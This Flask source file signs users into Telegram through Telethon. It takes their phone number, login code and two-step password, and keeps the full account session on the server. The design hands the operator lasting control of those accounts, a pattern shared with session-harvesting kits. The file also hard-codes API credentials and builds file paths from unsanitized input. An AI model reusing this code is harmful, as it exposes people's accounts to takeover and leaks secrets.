# login_api.py
import os
import asyncio
from flask import Flask, request, jsonify

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

from database import get_db

API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

app = Flask(__name__)

pending_codes = {}  # phone -> phone_code_hash

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(
            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
            API_ID,
            API_HASH
        )
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result.phone_code_hash

    try:
        phone_code_hash = asyncio.run(_send())
        pending_codes[phone] = phone_code_hash
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")
    phone_code_hash = pending_codes.get(phone)

    if not phone_code_hash:
        return jsonify({"status": "error", "message": "Code expired"})

    async def _verify():
        client = TelegramClient(
            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
            API_ID,
            API_HASH
        )
        await client.connect()
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
        await client.disconnect()

    try:
        asyncio.run(_verify())
        pending_codes.pop(phone, None)
        return jsonify({"status": "ok"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})
    except Exception:
        return jsonify({"status": "error"})

@app.route("/verify_password", methods=["POST"])
def verify_password():
    phone = request.json.get("phone")
    password = request.json.get("password")

    async def _verify():
        temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
        client = TelegramClient(temp_session, API_ID, API_HASH)

        await client.connect()
        await client.sign_in(password=password)

        me = await client.get_me()

        # 🔥 ASOSIY NUQTA: sessionni USER_ID bilan saqlaymiz
        final_session = os.path.join(SESSIONS_DIR, str(me.id))
        client.session.save(final_session)

        await client.disconnect()
        return me

    try:
        me = asyncio.run(_verify())

        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id, phone, username)
            VALUES (%s, %s, %s)
            ON CONFLICT (user_id) DO NOTHING
        """, (me.id, phone, me.username))
        conn.commit()
        conn.close()

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})
